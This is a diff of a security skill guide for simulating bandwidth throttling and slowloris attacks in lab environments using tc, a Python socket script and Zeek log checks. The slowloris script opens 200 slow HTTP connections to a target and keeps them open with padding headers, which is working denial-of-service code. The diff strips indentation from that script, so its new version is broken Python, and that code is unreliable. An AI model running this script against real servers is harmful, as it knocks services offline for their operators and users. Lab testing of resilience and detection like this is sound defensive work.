@@ -1,12 +1,12 @@
 ---
 name: performing-bandwidth-throttling-attack-simulation
 description: 'Simulate bandwidth throttling and network degradation attacks using tc,
-  iperf3, and Scapy in authorized lab environments to test QoS controls, application
-  resilience, and monitoring detection of traffic manipulation. Use when validating
-  how VoIP, video, or other real-time applications and network monitoring tools respond
-  to degraded bandwidth or slowloris-style throttling attacks.
+ iperf3, and Scapy in authorized lab environments to test QoS controls, application
+ resilience, and monitoring detection of traffic manipulation. Use when validating
+ how VoIP, video, or other real-time applications and network monitoring tools respond
+ to degraded bandwidth or slowloris-style throttling attacks.
 
-  '
+ '
 domain: cybersecurity
 subdomain: network-security
 tags:
@@ -102,7 +102,7 @@ sudo tc class add dev eth0 parent 1:1 classid 1:99 htb rate 1000mbit
 
 # Filter: throttle only traffic to 10.10.20.10
 sudo tc filter add dev eth0 parent 1: protocol ip prio 1 u32 \
-  match ip dst 10.10.20.10/32 flowid 1:10
+ match ip dst 10.10.20.10/32 flowid 1:10
 
 # Verify the qdisc configuration
 tc -s qdisc show dev eth0
@@ -164,49 +164,49 @@ NUM_CONNECTIONS = 200
 sockets = []
 
 def create_slow_connection():
-    """Create a connection that sends data very slowly."""
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(4)
-        s.connect((TARGET, PORT))
-        s.send(b"GET / HTTP/1.1\r\n")
-        s.send(f"Host: {TARGET}\r\n".encode())
-        sockets.append(s)
-        return s
-    except Exception:
-        return None
+ """Create a connection that sends data very slowly."""
+ try:
+ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ s.settimeout(4)
+ s.connect((TARGET, PORT))
+ s.send(b"GET / HTTP/1.1\r\n")
+ s.send(f"Host: {TARGET}\r\n".encode())
+ sockets.append(s)
+ return s
+ except Exception:
+ return None
 
 def keep_alive():
-    """Send partial headers to keep connections open."""
-    while True:
-        for s in list(sockets):
-            try:
-                s.send(b"X-Padding: " + b"A" * 10 + b"\r\n")
-            except Exception:
-                sockets.remove(s)
-        time.sleep(15)
+ """Send partial headers to keep connections open."""
+ while True:
+ for s in list(sockets):
+ try:
+ s.send(b"X-Padding: " + b"A" * 10 + b"\r\n")
+ except Exception:
+ sockets.remove(s)
+ time.sleep(15)
 
 print(f"[*] Opening {NUM_CONNECTIONS} slow connections to {TARGET}:{PORT}")
 for i in range(NUM_CONNECTIONS):
-    s = create_slow_connection()
-    if s:
-        if (i + 1) % 50 == 0:
-            print(f"[*] {i + 1} connections established")
-    time.sleep(0.1)
+ s = create_slow_connection()
+ if s:
+ if (i + 1) % 50 == 0:
+ print(f"[*] {i + 1} connections established")
+ time.sleep(0.1)
 
 print(f"[*] {len(sockets)} connections open. Sending keep-alive headers...")
 print("[*] Press Ctrl+C to stop")
 
 try:
-    keep_alive()
+ keep_alive()
 except KeyboardInterrupt:
-    print(f"\n[*] Closing {len(sockets)} connections")
-    for s in sockets:
-        try:
-            s.close()
-        except Exception:
-            pass
-    print("[*] Cleanup complete")
+ print(f"\n[*] Closing {len(sockets)} connections")
+ for s in sockets:
+ try:
+ s.close()
+ except Exception:
+ pass
+ print("[*] Cleanup complete")
 ```
 
 ### Step 5: Measure Impact and Detect Anomalies
@@ -227,8 +227,8 @@ ping -c 50 10.10.20.10
 
 # Check Zeek logs for connection anomalies
 cat /opt/zeek/logs/current/conn.log | \
-  zeek-cut ts id.orig_h id.resp_h duration orig_bytes resp_bytes | \
-  awk '$4 > 0 && ($5/$4 < 1000 || $6/$4 < 1000)' | head -20
+ zeek-cut ts id.orig_h id.resp_h duration orig_bytes resp_bytes | \
+ awk '$4 > 0 && ($5/$4 < 1000 || $6/$4 < 1000)' | head -20
 # Low bytes/second ratio indicates throttling
 
 # Check for QoS alerts in network management tools
